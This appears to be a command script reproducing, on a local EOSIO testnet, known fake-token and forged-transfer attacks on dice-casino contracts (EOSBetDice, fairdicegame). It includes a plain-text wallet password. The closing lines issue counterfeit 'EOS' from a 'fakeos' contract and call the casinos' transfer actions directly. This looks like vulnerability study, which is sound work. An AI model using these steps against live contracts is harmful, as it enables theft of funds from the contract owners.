cleos wallet unlock
PW5Ka31xY1nG97A83pvzCUQ98oYqNDvwaXSnjNp2xTFNE91QgWHGA

nodeos -e -p eosio \
--plugin eosio::producer_plugin \
--plugin eosio::chain_api_plugin \
--plugin eosio::http_plugin \
--plugin eosio::history_plugin \
--plugin eosio::history_api_plugin \
--data-dir CONTRACTS_DIR/eosio/data \
--config-dir CONTRACTS_DIR/eosio/config \
--access-control-allow-origin='*' \
--contracts-console \
--http-validate-host=false \
--verbose-http-errors \
--filter-on='*' >> nodeos.log 2>&1 &
tail -f nodeos.log

cleos create account eosio eosio.token EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos create account eosio alice EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos create account eosio bob EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos create account eosio eosbetcasino EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos create account eosio fairdicegame EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos create account eosio fakeos EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V
cleos set account permission alice active --add-code
cleos set account permission bob active --add-code
cleos set account permission eosbetcasino active --add-code
cleos set account permission fairdicegame active --add-code
cleos set account permission fakeos active --add-code

cleos set contract eosio.token ./study1/eosio.token --abi eosio.token.abi -p eosio.token@active
cleos push action eosio.token create '[ "eosio", "1000000000.0000 EOS"]' -p eosio.token@active
cleos push action eosio.token issue '[ "alice", "1000.0000 EOS", "memo" ]' -p eosio@active
cleos push action eosio.token issue '[ "bob", "2000.0000 EOS", "memo" ]' -p eosio@active
cleos push action eosio.token issue '[ "eosbetcasino", "1000.0000 EOS", "memo" ]' -p eosio@active
cleos push action eosio.token issue '[ "fairdicegame", "1000.0000 EOS", "memo" ]' -p eosio@active

cleos set contract eosbetcasino ./study1/EOSBetDice
cleos push action eosbetcasino initcontract '["EOS4txmdWWQKEr7YP3tBeDjLt5UZ5UDbJzpmBLX5aHkRm8TjeeY9V"]' -p eosbetcasino@active
cleos transfer alice eosbetcasino "1 EOS" "96"
cleos get table eosbetcasino eosbetcasino activebets

cleos push action eosbetcasino resolvebet '["11032539410485486696","SIG_K1_K1FWRDNsuHW54XfQ5vtbyFT4F55FSVdXEjRAYPJqGzKrxWMMWqyvNMjL4o3yHXebFMMzj34nNNPEQ1Ety7rmk2bfVBRjpW"]' -p alice@active
cleos get currency balance eosio.token alice 
cleos push action eosbetcasino transfer '["alice","eosbetcasino","1.0000 EOS","96"]' -p alice@active

cleos set contract fakeos ./study1/eosio.token --abi eosio.token.abi -p fakeos@active
cleos push action fakeos create '[ "fakeos", "1000000000.0000 EOS"]' -p fakeos@active
cleos push action fakeos issue '[ "alice", "10000.0000 EOS", "memo" ]' -p fakeos@active
cleos push action fakeos transfer '["alice","eosbetcasino","1.0000 EOS","96"]' -p alice@active

cleos set contract fairdicegame ./study1/fairdicegame
cleos transfer alice fairdicegame "1 EOS" "96-75f81d69757eefae15875f0287d99913cadc1d5f749c4c854ec09f9e213b8c02-365d60bd9d132e11bdf2ff4c9070ae350edfb793-1547110891-fairdicegame-SIG_K1_Ki5BC86jR1J2oiekLh4bWDeKqhRcDfPEc87VSxmKjLJ3HcFgrFoBVNUnGxpXXSm6qFRNGJp2mrxrEKsUGhAG8mM77s3G1N"
cleos push action fairdicegame transfer '["alice","fairdicegame","1.0000 EOS","96-75f81d69757eefae15875f0287d99913cadc1d5f749c4c854ec09f9e213b8c02-365d60bd9d132e11bdf2ff4c9070ae350edfb793-1547110891-fairdicegame-SIG_K1_Ki5BC86jR1J2oiekLh4bWDeKqhRcDfPEc87VSxmKjLJ3HcFgrFoBVNUnGxpXXSm6qFRNGJp2mrxrEKsUGhAG8mM77s3G1N"]' -p alice@active
cleos push action fakeos transfer '["alice","fairdicegame","1.0000 EOS","96-75f81d69757eefae15875f0287d99913cadc1d5f749c4c854ec09f9e213b8c02-365d60bd9d132e11bdf2ff4c9070ae350edfb793-1547110891-fairdicegame-SIG_K1_Ki5BC86jR1J2oiekLh4bWDeKqhRcDfPEc87VSxmKjLJ3HcFgrFoBVNUnGxpXXSm6qFRNGJp2mrxrEKsUGhAG8mM77s3G1N"]' -p alice@active




